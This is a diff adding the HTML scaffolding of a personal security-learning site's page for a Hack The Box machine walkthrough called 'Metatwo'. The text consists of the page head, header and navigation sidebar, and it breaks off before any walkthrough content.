@@ -1,0 +1,2578 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="My personal knowledge repository">
+      
+      
+        <meta name="author" content="amandaguglieri">
+      
+      
+        <link rel="canonical" href="https://amandaguglieri.github.io/hackinglife/htb-metatwo/">
+      
+      
+        <link rel="prev" href="../ejpt/">
+      
+      
+        <link rel="next" href="../htb-photobomb/">
+      
+      <link rel="icon" href="../img/favicon.png">
+      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-9.0.3">
+    
+    
+      
+        <title>Metatwo Machine - Hacking Life</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.6b71719e.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.2505c338.min.css">
+      
+      
+
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="pink" data-md-color-accent="indigo">
+  
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#about-the-machine" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="Hacking Life" class="md-header__button md-logo" aria-label="Hacking Life" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9 7v10h2v-4h2v4h2V7h-2v4h-2V7H9M5 3h14a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Hacking Life
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Metatwo Machine
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <form class="md-header__option" data-md-component="palette">
+        
+          
+          <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="pink" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+          
+            <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6zm0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4zM7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+            </label>
+          
+        
+          
+          <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="pink" data-md-color-accent="light-blue"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
+          
+            <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3Z"/></svg>
+            </label>
+          
+        
+      </form>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/amandaguglieri/hackinglife" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    amandaguglieri/hackinglife
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="Hacking Life" class="md-nav__button md-logo" aria-label="Hacking Life" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9 7v10h2v-4h2v4h2V7h-2v4h-2V7H9M5 3h14a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2Z"/></svg>
+
+    </a>
+    Hacking Life
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/amandaguglieri/hackinglife" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    amandaguglieri/hackinglife
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        Home
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2" tabindex="0" aria-expanded="false">
+          Cheat sheets
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Cheat sheets" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          Cheat sheets
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../amass/" class="md-nav__link">
+        amass
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../apktool/" class="md-nav__link">
+        apktool
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../bash/" class="md-nav__link">
+        bash
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../acronyms/" class="md-nav__link">
+        cyber acronyms
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ctr/" class="md-nav__link">
+        crt.sh
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../dnscan/" class="md-nav__link">
+        dnscan
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../drozer/" class="md-nav__link">
+        drozer
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../emacs/" class="md-nav__link">
+        emacs
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../fping/" class="md-nav__link">
+        fping
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../frida/" class="md-nav__link">
+        frida
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../git/" class="md-nav__link">
+        git
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../google-dorks/" class="md-nav__link">
+        google dorks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hugo/" class="md-nav__link">
+        hugo
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../i3/" class="md-nav__link">
+        i3
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../impacket/" class="md-nav__link">
+        impacket
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../markdown/" class="md-nav__link">
+        markdown
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../mariadb/" class="md-nav__link">
+        mariadb
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../masscan/" class="md-nav__link">
+        masscan
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../mobsf/" class="md-nav__link">
+        mobsf
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../mssql/" class="md-nav__link">
+        msSQL
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../mysql/" class="md-nav__link">
+        mySQL
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../nessus/" class="md-nav__link">
+        nessus
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../netcat/" class="md-nav__link">
+        netcat
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../nmap/" class="md-nav__link">
+        nmap
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../objection/" class="md-nav__link">
+        objection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../openssl/" class="md-nav__link">
+        openSSL
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../p0f/" class="md-nav__link">
+        p0f
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ping/" class="md-nav__link">
+        ping
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../powershell/" class="md-nav__link">
+        powershell
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sqli/" class="md-nav__link">
+        sql injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sqlmap/" class="md-nav__link">
+        sqlmap
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ssh-tunneling/" class="md-nav__link">
+        ssh tunneling
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sublist3r/" class="md-nav__link">
+        sublist3r
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../vim/" class="md-nav__link">
+        vim
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../winpeas/" class="md-nav__link">
+        winPEAS
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3" tabindex="0" aria-expanded="false">
+          Courses
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Courses" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          Courses
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " data-md-toggle="__nav_3_1" type="checkbox" id="__nav_3_1" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3_1" tabindex="0" aria-expanded="false">
+          Hacking APIs
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Hacking APIs" data-md-level="2">
+        <label class="md-nav__title" for="__nav_3_1">
+          <span class="md-nav__icon md-icon"></span>
+          Hacking APIs
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/" class="md-nav__link">
+        Intro
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/apireconnaissance/" class="md-nav__link">
+        Api Reconnaissance
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/endpoint-analysis/" class="md-nav__link">
+        Endpoint Analysis
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/scanning-apis/" class="md-nav__link">
+        Scanning APIs
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/api-authentication-attacks/" class="md-nav__link">
+        API authentication attacks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/exploiting-api-authorization/" class="md-nav__link">
+        Exploiting API Authorization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/improper-assets-management/" class="md-nav__link">
+        Improper assets management
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/mass-assignment/" class="md-nav__link">
+        Mass assignment
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/server-side-request-forgery/" class="md-nav__link">
+        Server-side Request Forgery
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/injection-attacks/" class="md-nav__link">
+        Injections attacks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/evasion-combining-techniques/" class="md-nav__link">
+        Evasion and combining techniques
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/other-labs/" class="md-nav__link">
+        Labs
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ejpt/" class="md-nav__link">
+        eJPT
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " data-md-toggle="__nav_4" type="checkbox" id="__nav_4" checked>
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4" tabindex="0" aria-expanded="true">
+          Walkthroughs
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Walkthroughs" data-md-level="1">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          Walkthroughs
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          metatwo
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        metatwo
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#about-the-machine" class="md-nav__link">
+    About the machine
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#getting-usertxt-flag" class="md-nav__link">
+    Getting user.txt flag
+  </a>
+  
+    <nav class="md-nav" aria-label="Getting user.txt flag">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#reconnaissance" class="md-nav__link">
+    Reconnaissance
+  </a>
+  
+    <nav class="md-nav" aria-label="Reconnaissance">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#active-scanning-serviceport-enumeration" class="md-nav__link">
+    Active Scanning: Service/Port enumeration
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#initial-access" class="md-nav__link">
+    Initial access
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#getting-the-systems-flag" class="md-nav__link">
+    Getting the System's flag
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#some-other-write-ups-and-learning-material-related" class="md-nav__link">
+    Some other write-ups and learning material related
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../htb-photobomb/" class="md-nav__link">
+        photobomb
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../htb-support/" class="md-nav__link">
+        support
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../htb-trick/" class="md-nav__link">
+        trick
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " data-md-toggle="__nav_5" type="checkbox" id="__nav_5" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_5" tabindex="0" aria-expanded="false">
+          Beginners' guide
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Beginners' guide" data-md-level="1">
+        <label class="md-nav__title" for="__nav_5">
+          <span class="md-nav__icon md-icon"></span>
+          Beginners' guide
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../checksum/" class="md-nav__link">
+        checksum
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../pdm/" class="md-nav__link">
+        pdm
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../python/" class="md-nav__link">
+        python
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ssh-for-github/" class="md-nav__link">
+        ssh for github
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " data-md-toggle="__nav_6" type="checkbox" id="__nav_6" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6" tabindex="0" aria-expanded="false">
+          Pentesting web
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Pentesting web" data-md-level="1">
+        <label class="md-nav__title" for="__nav_6">
+          <span class="md-nav__icon md-icon"></span>
+          Pentesting web
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../reverse-shells/" class="md-nav__link">
+        Reverse shells
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sql-injection/" class="md-nav__link">
+        sql injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " data-md-toggle="__nav_7" type="checkbox" id="__nav_7" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_7" tabindex="0" aria-expanded="false">
+          Network Services Pentestings
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Network Services Pentestings" data-md-level="1">
+        <label class="md-nav__title" for="__nav_7">
+          <span class="md-nav__icon md-icon"></span>
+          Network Services Pentestings
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../21-ftp/" class="md-nav__link">
+        21 ftp
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../23-telnet/" class="md-nav__link">
+        23 telnet
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../445-smb/" class="md-nav__link">
+        445 smb
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../873-rsync/" class="md-nav__link">
+        873 rsync
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1433-mssql/" class="md-nav__link">
+        1433 mssql
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../3306-mariadb-mysql/" class="md-nav__link">
+        3306 mariadb
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../3389-rdp/" class="md-nav__link">
+        3389 RDP
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../5432-postgresql/" class="md-nav__link">
+        5432 postgresql
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../6379-redis/" class="md-nav__link">
+        6379 redis
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../27017-27018-mongodb/" class="md-nav__link">
+        27017 mongodb
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../27017-27018-mongodb/" class="md-nav__link">
+        27018 mongodb
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " data-md-toggle="__nav_8" type="checkbox" id="__nav_8" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_8" tabindex="0" aria-expanded="false">
+          Pentesting mobile
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Pentesting mobile" data-md-level="1">
+        <label class="md-nav__title" for="__nav_8">
